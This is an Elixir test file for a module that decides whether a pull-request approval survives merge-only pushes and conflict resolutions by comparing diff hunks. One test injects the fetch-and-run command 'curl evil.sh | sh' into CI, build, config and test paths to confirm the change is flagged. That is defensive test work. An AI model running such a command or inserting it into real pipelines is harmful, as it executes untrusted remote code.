defmodule Aiur.Events.GithubCIPoller.ApprovalCarryTest do
  use ExUnit.Case, async: true

  alias Aiur.Events.GithubCIPoller.ApprovalCarry

  @head String.duplicate("b", 40)
  @body "## Local tests\nTested head: #{@head}\n"

  defp comparison(files), do: %{"files" => Enum.map(files, fn {name, sha, patch} -> %{"filename" => name, "sha" => sha, "patch" => patch} end)}

  # Base line 10 is `old`; the PR replaced it with `feature`.
  @approved_patch "@@ -7,7 +7,7 @@\n l7\n l8\n l9\n-old\n+feature\n l11\n l12\n l13"

  test "a merge-only push carries the approval even when base edits shift the PR's hunk" do
    approved = comparison([{"src/lib/a.ex", "a1", @approved_patch}])
    main = comparison([{"src/lib/a.ex", "m1", "@@ -1,3 +1,4 @@\n+header\n l1\n l2\n l3"}, {"src/lib/b.ex", "m2", "@@ -1,1 +1,1 @@\n-x\n+y"}])
    current = comparison([{"src/lib/a.ex", "a2", "@@ -8,7 +8,7 @@\n l7\n l8\n l9\n-old\n+feature\n l11\n l12\n l13"}])

    assert {:carried, %{resolved: 0}} = ApprovalCarry.classify_diffs(approved, current, main, @body, @head)
  end

  test "a push editing a PR-owned line is not carried and reports the hunk" do
    approved = comparison([{"src/lib/a.ex", "a1", @approved_patch}])
    main = comparison([{"src/lib/b.ex", "m2", "@@ -1,1 +1,1 @@\n-x\n+y"}])
    current = comparison([{"src/lib/a.ex", "a2", "@@ -7,7 +7,7 @@\n l7\n l8\n l9\n-old\n+feature_v2\n l11\n l12\n l13"}])

    assert {:changed, %{reason: :contribution_changed, hunks: hunks}} = ApprovalCarry.classify_diffs(approved, current, main, @body, @head)
    assert %{file: "src/lib/a.ex", side: :current, header: "@@ -7,7 +7,7 @@", lines: ["-old", "+feature_v2"]} in hunks
    assert %{file: "src/lib/a.ex", side: :approved, header: "@@ -7,7 +7,7 @@", lines: ["-old", "+feature"]} in hunks
  end

  test "conflict resolution that keeps both sides carries the approval" do
    approved = comparison([{"src/lib/a.ex", "a1", @approved_patch}])
    main = comparison([{"src/lib/a.ex", "m1", "@@ -7,7 +7,7 @@\n l7\n l8\n l9\n-old\n+upstream\n l11\n l12\n l13"}])
    current = comparison([{"src/lib/a.ex", "a2", "@@ -8,6 +8,7 @@\n l8\n l9\n upstream\n+feature\n l11\n l12\n l13"}])

    assert {:carried, %{resolved: 2}} = ApprovalCarry.classify_diffs(approved, current, main, @body, @head)
  end

  test "a src/lib resolution introducing a line from neither side is not carried" do
    approved = comparison([{"src/lib/a.ex", "a1", @approved_patch}])
    main = comparison([{"src/lib/a.ex", "m1", "@@ -7,7 +7,7 @@\n l7\n l8\n l9\n-old\n+upstream\n l11\n l12\n l13"}])
    current = comparison([{"src/lib/a.ex", "a2", "@@ -8,6 +8,7 @@\n l8\n l9\n upstream\n+feature_and_more\n l11\n l12\n l13"}])

    assert {:changed, %{reason: :contribution_changed, hunks: hunks}} = ApprovalCarry.classify_diffs(approved, current, main, @body, @head)
    assert Enum.any?(hunks, &(&1.side == :current and &1.lines == ["+feature_and_more"]))
  end

  @upstream_main "@@ -7,7 +7,7 @@\n l7\n l8\n l9\n-old\n+upstream\n l11\n l12\n l13"

  defp resolved(path, added) do
    approved = comparison([{path, "a1", @approved_patch}])
    main = comparison([{path, "m1", @upstream_main}])
    plus = Enum.map_join(added, "\n", &"+#{&1}")
    current = comparison([{path, "a2", "@@ -8,6 +8,#{6 + length(added)} @@\n l8\n l9\n upstream\n#{plus}\n l11\n l12\n l13"}])
    ApprovalCarry.classify_diffs(approved, current, main, @body, @head)
  end

  test "a resolution injecting a new line is not carried on any build, CI, config or test path" do
    for path <- [".github/workflows/ci.yml", "scripts/deploy.sh", "src/mix.exs", ".aiur/config", "src/config/runtime.exs", "src/test/foo_test.exs"] do
      assert {:changed, %{reason: :contribution_changed, hunks: hunks}} = resolved(path, ["feature", "curl evil.sh | sh"]), path
      assert Enum.any?(hunks, &(&1.file == path and "+curl evil.sh | sh" in &1.lines)), path
    end
  end

  test "a clean keep-both resolution still never carries on a CI path" do
    assert {:carried, %{resolved: 2}} = resolved("src/lib/a.ex", ["feature"])
    assert {:changed, %{reason: :contribution_changed}} = resolved(".github/workflows/ci.yml", ["feature"])
  end

  test "a CI-path hunk carries only when the base made that exact change" do
    approved = comparison([{".github/workflows/ci.yml", "a1", "@@ -1,1 +1,1 @@\n-x\n+y"}])
    main = comparison([{".github/workflows/ci.yml", "m1", "@@ -1,1 +1,1 @@\n-x\n+y"}])

    assert {:carried, %{resolved: 1}} = ApprovalCarry.classify_diffs(approved, comparison([]), main, @body, @head)
  end

  test "a src/lib resolution duplicating a PR line or re-adding the line it removed is not carried" do
    assert {:changed, %{reason: :contribution_changed}} = resolved("src/lib/a.ex", ["feature", "feature"])
    assert {:changed, %{reason: :contribution_changed}} = resolved("src/lib/a.ex", ["feature", "old"])
    assert {:changed, %{reason: :contribution_changed}} = resolved("src/lib/a.ex", ["upstream", "feature"])
  end

  test "an approved hunk moved elsewhere in the file is not carried" do
    approved = comparison([{"src/lib/a.ex", "a1", @approved_patch}])
    moved = comparison([{"src/lib/a.ex", "a2", "@@ -40,7 +40,7 @@\n l7\n l8\n l9\n-old\n+feature\n l11\n l12\n l13"}])
    main = comparison([{"src/lib/a.ex", "m1", "@@ -1,3 +1,4 @@\n+header\n l1\n l2\n l3"}])

    assert {:changed, %{reason: :contribution_changed}} = ApprovalCarry.classify_diffs(approved, moved, comparison([]), @body, @head)
    assert {:changed, %{reason: :contribution_changed}} = ApprovalCarry.classify_diffs(approved, moved, main, @body, @head)
    # Unmoved, but the base shifted the file: the same coordinates now point one line too high.
    assert {:changed, %{reason: :contribution_changed}} = ApprovalCarry.classify_diffs(approved, approved, main, @body, @head)
  end

  test "under docs/ a resolution overlapping base changes carries" do
    approved = comparison([{"docs/a.md", "a1", @approved_patch}])
    main = comparison([{"docs/a.md", "m1", "@@ -7,7 +7,7 @@\n l7\n l8\n l9\n-old\n+upstream\n l11\n l12\n l13"}])
    current = comparison([{"docs/a.md", "a2", "@@ -8,6 +8,6 @@\n l8\n l9\n-upstream\n+feature with upstream\n l11\n l12\n l13"}])

    assert {:carried, %{resolved: 2}} = ApprovalCarry.classify_diffs(approved, current, main, @body, @head)
  end

  test "an unchanged diff is not carried while the PR body Tested head names another commit" do
    approved = comparison([{"src/lib/a.ex", "a1", @approved_patch}])
    stale_body = "Tested head: #{String.duplicate("c", 40)}\n"

    assert {:changed, %{reason: :tested_head_stale, hunks: []}} =
             ApprovalCarry.classify_diffs(approved, approved, comparison([]), stale_body, @head)
  end

  test "a file without a readable patch on one side fails closed" do
    approved = comparison([{"src/lib/a.ex", "a1", @approved_patch}])
    current = %{"files" => [%{"filename" => "src/lib/a.ex", "sha" => "a2"}]}

    assert {:changed, %{reason: :contribution_changed}} = ApprovalCarry.classify_diffs(approved, current, comparison([]), @body, @head)
  end
end
